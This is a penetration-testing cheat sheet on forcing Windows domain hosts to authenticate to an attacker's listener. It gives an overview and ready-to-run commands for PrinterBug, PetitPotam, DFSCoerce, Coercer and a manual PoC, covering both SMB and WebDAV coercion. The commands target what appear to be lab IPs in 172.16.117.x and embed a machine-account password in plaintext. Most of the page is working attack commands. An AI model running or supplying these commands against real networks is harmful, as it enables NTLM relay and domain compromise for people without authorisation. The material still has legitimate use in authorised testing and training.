# 12.03 Coercion Techniques

> Coerce SMB/HTTP auth via `PetitPotam` (MS-EFSRPC), `PrinterBug` (MS-RPRN), `DFSCoerce`, or `Coercer`'s 17-method scanner.

## Overview

Force a target host to authenticate to the attacker's listener. PrinterBug (MS-RPRN) and PetitPotam (MS-EFSRPC) coerce SMB or HTTP auth from domain-joined machines using valid domain credentials. DFSCoerce abuses MS-DFSNM. Coercer automates 17 methods across 5 RPC protocols in either scan or coerce mode. For HTTP coercion via WebDAV, pass a connection string HOSTNAME@PORT/PATH as the listener.

## Steps

- Requires valid domain credentials (e.g. a machine account created via LDAP relay)
- For SMB coercion: listener is the plain attacker IP
- For HTTP coercion (WebDAV): listener is HOSTNAME@PORT/PATH — Responder poisons the name
- printerbug.py: MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx
- PetitPotam.py: MS-EFSRPC EfsRpcOpenFileRaw / EfsRpcEncryptFileSrv
- dfscoerce.py: MS-DFSNM NetrDfsRemoveStdRoot
- Coercer scan mode: tests RPC calls without coercing; coerce mode: actively triggers auth
- coerce_poc.py: manual per-method exploitation from the coerce-methods repo

## Commands

### PrinterBug → DC (SMB)

```bash
python3 printerbug.py <DOMAIN>/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.3 172.16.117.30
```

### PrinterBug → SQL01 (HTTP/WebDAV)

```bash
python3 printerbug.py <DOMAIN>/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.60 SUPPORTPC@80/print
```

### PetitPotam → DC (SMB)

```bash
python3 PetitPotam.py 172.16.117.30 172.16.117.3 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d <DOMAIN>.local
```

### PetitPotam → SQL01 (HTTP/WebDAV)

```bash
python3 PetitPotam.py WIN-MMRQDG2R0ZX@80/files 172.16.117.60 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe'
```

### DFSCoerce

```bash
python3 dfscoerce.py -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' 172.16.117.30 172.16.117.3
```

### Coercer scan mode

```bash
Coercer scan -t 172.16.117.50 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d <DOMAIN>.local -v
```

### Coercer coerce mode

```bash
Coercer coerce -t 172.16.117.50 -l 172.16.117.30 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d <DOMAIN>.local -v --always-continue
```

### Coercer HTTP/WebDAV (v1.6)

```bash
python3 Coercer.py -t 172.16.117.60 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -wh SUPPORTPC2 -wp 80 -v
```

### Manual coerce_poc (MS-DFSNM)

```bash
python3 coerce_poc.py -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -d <DOMAIN>.local 172.16.117.30 172.16.117.3
```
